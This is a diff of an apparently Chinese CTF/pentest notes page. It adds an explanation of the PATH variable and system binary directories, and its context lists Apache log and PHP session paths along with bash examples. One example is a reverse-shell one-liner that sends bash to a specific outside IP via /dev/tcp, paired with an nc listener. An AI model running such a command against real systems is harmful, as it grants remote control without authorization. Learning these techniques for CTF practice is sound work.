@@ -235,7 +235,11 @@
 <li>apache<br>/var/log/apache2/<br>/var/log/apache2/access.log 如果是静态靶场的化可以查看别人的poc<br>/var/log/apache2/error.log</li>
 </ol>
 <p>/var/www/html           Apache默认Web根目录<br>2. php session目录<br>/var/lib/php7/sessions/</p>
-<h3 id="linux命令"><a href="#linux命令" class="headerlink" title="linux命令"></a>linux命令</h3><h4 id="shell命令"><a href="#shell命令" class="headerlink" title="shell命令"></a>shell命令</h4><p>bash -c 命令</p>
+<h3 id="linux命令"><a href="#linux命令" class="headerlink" title="linux命令"></a>linux命令</h3><p>在类 Unix 系统中，<strong>PATH</strong> 是一个环境变量，它告诉 shell（如 Bash、Zsh）在哪些目录下查找可执行的命令。当你输入一个命令时，系统会按照 PATH 变量中的路径顺序，逐一查找该命令对应的可执行文件。</p>
+<p>如果 /usr/bin 目录包含在 PATH 中（通常是默认配置），那么你可以直接在终端中输入该目录下的命令，系统会自动在 /usr/bin 目录中找到并执行它</p>
+<p><code>echo $PATH</code>查看 PATH 环境变量</p>
+<p>/bin 存放的是系统引导和修复所需的基础命令,例如 ls, cp, mv, rm, cat, sh 等<br>/usr/bin 存放的是常用的用户命令和应用程序,例如，文本编辑器（如 vim）、编译器（如 gcc）、各种脚本语言的解释器（如 python, perl）等。</p>
+<h4 id="shell命令"><a href="#shell命令" class="headerlink" title="shell命令"></a>shell命令</h4><p>bash -c 命令</p>
 <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:  bash -c whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure>
 <p>bash -i 命令<br>以交互方式运行shell</p>
 <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#    目标主机：</span></span><br><span class="line">root@kali:  bash -c <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/120.46.41.173/9023 0&gt;&amp;1&quot;</span></span><br><span class="line"><span class="comment">#    接受主机：</span></span><br><span class="line">nc -lvp 2222</span><br></pre></td></tr></table></figure>
